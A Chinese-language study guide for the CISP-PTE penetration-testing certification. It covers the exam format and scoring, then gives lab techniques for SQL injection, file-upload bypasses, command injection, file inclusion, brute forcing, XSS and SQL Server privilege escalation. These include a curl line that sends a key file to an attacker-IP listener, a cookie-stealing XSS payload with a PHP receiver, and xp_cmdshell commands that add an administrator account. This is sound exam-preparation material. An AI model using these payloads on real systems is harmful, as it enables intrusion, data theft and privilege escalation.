## 📋 概述：CISP-PTE认证简介

CISP-PTE，全称“注册信息安全专业人员-渗透测试工程师”，是由中国信息安全测评中心推出的国家级认证。该证书旨在证明持证人员具备从事安全渗透测试工作的规划、执行和报告能力。

上一节我们介绍了课程的整体框架，本节中我们来看看关于这个证书最核心的三个问题。

### 关于CISP-PTE的三个核心问题

以下是关于CISP-PTE证书最常被问到的三个问题及其解答：

1.  **CISP-PTE证书值得考吗？**
    *   **答案：值得。** 因为它是目前国内渗透测试领域**唯一**具有国家级背书的认证。

2.  **CISP-PTE证书靠谱吗？**
    *   **答案：靠谱。** 其认证机构为中国信息安全测评中心（政府背景），技术输出方为网神（现属360），具有权威的官方和技术双重背书。

3.  **CISP-PTE容易考吗？**
    *   **答案：看完本教程，你会觉得相对容易。** 考试侧重于基础实操，知识点明确。

## 🔍 CISP认证体系与PTE定位

在深入了解PTE之前，我们需要将其放在更广阔的CISP认证体系中来看。

*   **CISSP**：国际认证，由(ISC)²颁发，认可度广。
*   **CISP**：国内最早的注册信息安全专业人员认证，知识面“一英里宽，一英寸深”。
*   **CISP-PTE**：专注于渗透测试的工程师级别认证，是CISP家族中的细分方向之一。

**CISP-PTE的核心优势**在于：
*   **国家级官方背书**，在政府、国企、重点行业项目中备受认可。
*   **无工作经验限制**，适合学生和从业经验不足的工程师。
*   作为敲门砖，能有效简化求职时的能力证明过程。

## 📊 考试大纲与分值解析

了解了如何报名，接下来我们深入考试本身，看看究竟考什么、怎么考。

### 知识体系与范围

考试内容主要涵盖以下四个技术领域：
1.  **Web安全基础**（占比约40%）：重点考察SQL注入、XSS、文件上传等常见Web漏洞。
2.  **中间件安全基础**（占比约20%）：主要涉及Apache、IIS等。
3.  **操作系统安全基础**（占比约20%）：Windows/Linux系统基础与提权。
4.  **数据库安全基础**（占比约20%）：重点考察SQL Server和MySQL。

### 考试形式与题型

考试为**无纸化上机操作**，时长4小时，题型分为两类：

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_49.png)

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_51.png)

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_53.png)

1.  **客观题（选择题）**：20道，每题1分，共20分。
2.  **实操题**：共80分，分为两种：
    *   **单项知识点题（CTF模式）**：5道，每题10分，共50分。每道题只考察一个漏洞类型（如一个单纯的SQL注入点）。
    *   **综合渗透题**：1道，包含3个得分点，每点10分，共30分。模拟一个真实网站进行逐步渗透。

**总分100分，70分即为通过。**

### 考场实战注意事项

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_61.png)

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_62.png)

在考试现场，你需要注意以下关键点：
*   **使用考场电脑**：不能使用自带的笔记本，需适应提供的WinXP/Win7系统及内置的老旧工具。
*   **得分凭证是Key**：实操题的得分以获取8位字符（如`A1B2C3D4`）的Key为准，需手动输入到提交页面，**务必仔细核对，避免输错**。
*   **虚拟机可能卡顿**：CTF题和综合渗透题通常运行在两个独立的虚拟机上，可能不流畅，需保持耐心。
*   **遵守考场纪律**：考场有监考，作弊等行为可能导致三年内禁考。

## 🛠️ 核心知识点与实战技巧

上一节我们介绍了考试的整体形式，本节中我们将逐一拆解核心的考点，并提供实战技巧和练习方法。

### 1. SQL注入

这是渗透测试中的“基础漏洞”，考试中大概率出现。

*   **实战工具**：主要使用 **`sqlmap`**。
*   **关键命令**：考试环境中，使用`sqlmap`的默认参数可能不够，需要提高检测等级和风险等级。
    ```bash
    sqlmap -u “目标URL” --level=5 --risk=3
    ```
*   **练习环境搭建**：推荐使用Docker快速搭建`sqli-labs`靶场进行练习。
    ```bash
    # 搜索并拉取镜像
    docker search sqli-labs
    docker pull acgpiano/sqli-labs
    # 运行环境
    docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs
    ```
*   **绕过技巧**：如果遇到过滤，可尝试使用`sqlmap`的`--tamper`参数调用绕过脚本（如`unmagicquotes.py`处理宽字节）。

### 2. 文件上传

文件上传漏洞的绕过是考试重点，思路要灵活。

*   **练习靶场**：推荐`Upload-Labs`（GitHub可下载），涵盖近20种上传防御场景。
*   **核心绕过思路**：
    *   **前端JS验证**：禁用浏览器JS或修改文件后缀绕过。
    *   **Content-Type验证**：抓包修改`Content-Type`为`image/jpeg`等。
    *   **黑名单绕过**：尝试特殊后缀（`.php5`, `.phtml`）、大小写、点空格（`shell.php.`）、`::$DATA`流、`.htaccess`文件解析等。
    *   **白名单/内容检测**：制作**图片马**，或上传一个用于**读取文件**的脚本而非Webshell，再通过文件包含漏洞执行。
        ```php
        <?php echo base64_encode(file_get_contents($_GET[‘f’])); ?>
        ```
    *   **解析漏洞**：利用Apache（`shell.php.jpg`）、Nginx（`shell.jpg/.php`）的解析特性。
    *   **00截断**：在路径中插入`%00`进行截断。

### 3. 命令执行

通常提供一个命令输入框（如Ping），需要注入并执行系统命令。

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_64.png)

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_66.png)

![](img/ee53ec7d69d4d27b9e9e6f90cb5785b2_68.png)

*   **常用连接符与绕过**：
    *   管道符：`|`
    *   逻辑与：`&`、`&&`
    *   逻辑或：`||`
    *   内联执行：`$(command)` 或 \`command\`
*   **空格绕过**：使用`${IFS}`、`$9`或`<`、`>`重定向符代替。
*   **命令绕过**：使用连接符分割命令，如`c’at’`。
*   **外带数据**：如果无法直接查看结果，可利用`curl`或`wget`将命令结果发送到自己的监听端口，或将文件打包后下载。
    ```bash
    # 在攻击机监听
    nc -lvp 9999
    # 在靶机执行，将结果发送到攻击机
    cat /key.php | curl -X POST --data-binary @- http://攻击机IP:9999
    ```

### 4. 文件包含

通常提供一个包含点，需要读取或执行特定文件（如`key.php`）。

*   **协议利用**：
    *   `php://input`：通过POST传入PHP代码执行。
    *   `php://filter`：用`base64`编码读取文件源码。
        ```
    ?file=php://filter/read=convert.base64-encode/resource=key.php
        ```
    *   `data://`：直接执行代码。`?file=data://text/plain,<?php phpinfo();?>`
*   **日志包含**：包含Web服务器日志文件，并在User-Agent中注入PHP代码，从而获得Webshell。
*   **技巧**：如果本题没有上传点，可结合其他题目的上传漏洞，上传一个Webshell，再在本题目中包含它。

### 5. 登录爆破

通常是送分题，但也可能增加难度。

*   **常规操作**：使用Burp Suite的Intruder模块，对用户名/密码进行爆破。
*   **加密处理**：如果密码被MD5或Base64加密，需要在Burp的Payload Processing中添加对应的加密规则。
*   **限制绕过**：如果限制本地登录，可尝试在请求头中添加`X-Forwarded-For: 127.0.0.1`。
*   **反向爆破**：如果密码复杂，可固定一个弱密码（如123456），去爆破用户名。

### 6. XSS（跨站脚本）

考试中可能以“窃取管理员Cookie”的形式出现。

*   **场景**：模拟一个存在XSS的前台页面，后台有管理员在登录浏览。
*   **难点**：考试环境无外网，无法使用公网XSS平台接收Cookie。
*   **解决方案**：利用其他题目已获取的Webshell，自己搭建一个简单的接收端。
    ```php
    <?php
    $cookie = $_GET[‘c’];
    $file = fopen(‘cookie.txt’, ‘a’);
    fwrite($file, $cookie . “\n”);
    fclose($file);
    ?>
    ```
*   **Payload**：构造XSS代码，将Cookie发送到你的接收页面。
    ```javascript
    <script>document.location=‘http://你的Webshell地址/cookie_recv.php?c=‘+document.cookie</script>
    ```

### 7. 综合渗透

模拟一个完整的网站（通常是ASP.NET + SQL Server环境），需要分步获取3个Key。

*   **信息收集**：扫描端口、目录，寻找泄露信息（如`web.config`文件中的数据库连接字符串）。
*   **获取Webshell**：
    *   通过SQL注入点获取后台账号密码，进入后台。
    *   在后台寻找文件上传点，利用上传技巧获取Webshell（第二个Key通常在此处或后台页面）。
    *   若无上传点，可尝试数据库备份功能，将木马文件备份成`.asp`或`.aspx`后缀。
*   **提权**：
    *   在SQL Server环境下，若拥有SA权限，可使用`xp_cmdshell`执行系统命令。
    *   启用`xp_cmdshell`的命令：
        ```sql
        EXEC sp_configure ‘show advanced options’, 1; RECONFIGURE; EXEC sp_configure ‘xp_cmdshell’, 1; RECONFIGURE;
        ```
    *   添加用户：`exec xp_cmdshell ‘net user test Test123456 /add && net localgroup administrators test /add‘`
    *   考试工具包中通常有集成这些功能的Webshell，可直接使用。
*   **寻找最终Key**：提权后，在服务器桌面、特殊目录或注册表中寻找第三个Key。

    *   时间通常充裕，合理分配，优先确保拿下基础题的分数。
